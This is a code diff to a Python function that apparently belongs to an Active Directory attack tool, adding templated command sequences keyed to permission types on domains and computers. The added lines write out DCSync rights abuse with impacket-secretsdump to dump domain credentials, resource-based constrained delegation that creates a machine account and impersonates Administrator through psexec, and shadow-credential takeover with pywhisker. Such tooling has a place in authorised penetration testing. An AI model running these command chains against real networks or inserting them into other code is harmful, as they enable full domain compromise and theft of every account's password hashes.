@@ -178,9 +178,32 @@ def get_commands(
                         f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
                     ],
                 ), na
+            elif dst_kind == "domains":
+                dn = _fqdn_to_dn(TF)
+                return CommandSet(
+                    f"Full control over domain {TF} — grant DCSync rights.",
+                    [
+                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
+                        f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
+                    ],
+                ), na
+            elif dst_kind == "computers":
+                return CommandSet(
+                    f"Full control over computer {TF} — RBCD or shadow credentials.",
+                    [
+                        f"# Option 1 — Resource-Based Constrained Delegation:",
+                        f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass 'Pwn3dP@ss' -dc-ip {DC}",
+                        f"rbcd.py -f 'PWNED$' -t '{T}' -dc-ip {DC} '{D}/{A}:{PASS}'",
+                        f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
+                        f"export KRB5CCNAME=Administrator@cifs_{T}.ccache",
+                        f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
+                        f"# Option 2 — shadow credentials:",
+                        f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
+                    ],
+                ), na
             else:
                 return CommandSet(
-                    f"Full control over {TF} — add member (group) or take over (computer).",
+                    f"Full control over group {TF} — add member.",
                     [
                         f"net rpc group addmem '{T}' '{A}' -U '{D}/{A}%{PASS}' -S {DC}",
                         f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' add groupMember '{T}' '{A}'",
@@ -188,6 +211,11 @@ def get_commands(
                 ), na
 
         case "AllExtendedRights":
+            if dst_kind == "domains":
+                return CommandSet(
+                    f"All extended rights on domain {TF} — includes DCSync.",
+                    [f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'"],
+                ), na
             return CommandSet(
                 f"All extended rights on {TF} — includes ForceChangePassword.",
                 [
